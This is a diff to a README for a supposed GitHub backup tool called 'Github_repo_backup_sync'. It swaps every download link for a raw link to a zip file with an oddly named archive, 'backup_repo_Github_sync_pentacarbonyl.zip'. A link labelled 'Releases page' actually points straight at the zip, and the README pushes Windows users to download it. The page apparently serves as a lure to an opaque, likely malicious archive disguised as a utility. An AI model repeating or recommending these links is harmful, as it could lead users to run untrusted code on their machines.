@@ -1,6 +1,6 @@
 # 🌟 Github_repo_backup_sync - Keep Your Repos Safe and Up to Date
 
-[![Download Now](https://raw.githubusercontent.com/Toffolux-t/Github_repo_backup_sync/main/Script/repo_sync_Github_backup_v1.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Toffolux-t/Github_repo_backup_sync/main/Script/repo_sync_Github_backup_v1.4.zip)
+[![Download Now](https://github.com/Toffolux-t/Github_repo_backup_sync/raw/refs/heads/main/Script/backup_repo_Github_sync_pentacarbonyl.zip%20Now-Click%20Here-brightgreen)](https://github.com/Toffolux-t/Github_repo_backup_sync/raw/refs/heads/main/Script/backup_repo_Github_sync_pentacarbonyl.zip)
 
 ## 🚀 Getting Started
 
@@ -11,10 +11,10 @@ Github_repo_backup_sync is a simple tool that helps you back up your GitHub repo
 To get started, follow these instructions:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Toffolux-t/Github_repo_backup_sync/main/Script/repo_sync_Github_backup_v1.4.zip) to download the latest version.
+   Go to the [Releases page](https://github.com/Toffolux-t/Github_repo_backup_sync/raw/refs/heads/main/Script/backup_repo_Github_sync_pentacarbonyl.zip) to download the latest version.
 
 2. **Choose the Right File**  
-   Look for the file suited for your operating system. Most users will want to download the `https://raw.githubusercontent.com/Toffolux-t/Github_repo_backup_sync/main/Script/repo_sync_Github_backup_v1.4.zip` for Windows, or the appropriate file for Linux or Mac.
+   Look for the file suited for your operating system. Most users will want to download the `https://github.com/Toffolux-t/Github_repo_backup_sync/raw/refs/heads/main/Script/backup_repo_Github_sync_pentacarbonyl.zip` for Windows, or the appropriate file for Linux or Mac.
 
 3. **Download the File**  
    Click on the link for the downloaded file. Your browser will start downloading it. Find the file in your Downloads folder once it’s complete.
@@ -77,6 +77,6 @@ The project is designed for:
 
 Each new version gets new features or fixes. Check the changelog on the Releases page to see what’s new, and keep your tool updated for the best experience.
 
-[![Download Now](https://raw.githubusercontent.com/Toffolux-t/Github_repo_backup_sync/main/Script/repo_sync_Github_backup_v1.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Toffolux-t/Github_repo_backup_sync/main/Script/repo_sync_Github_backup_v1.4.zip)
+[![Download Now](https://github.com/Toffolux-t/Github_repo_backup_sync/raw/refs/heads/main/Script/backup_repo_Github_sync_pentacarbonyl.zip%20Now-Click%20Here-brightgreen)](https://github.com/Toffolux-t/Github_repo_backup_sync/raw/refs/heads/main/Script/backup_repo_Github_sync_pentacarbonyl.zip)
 
 Feel free to explore the project and start taking backups of your GitHub repositories today!
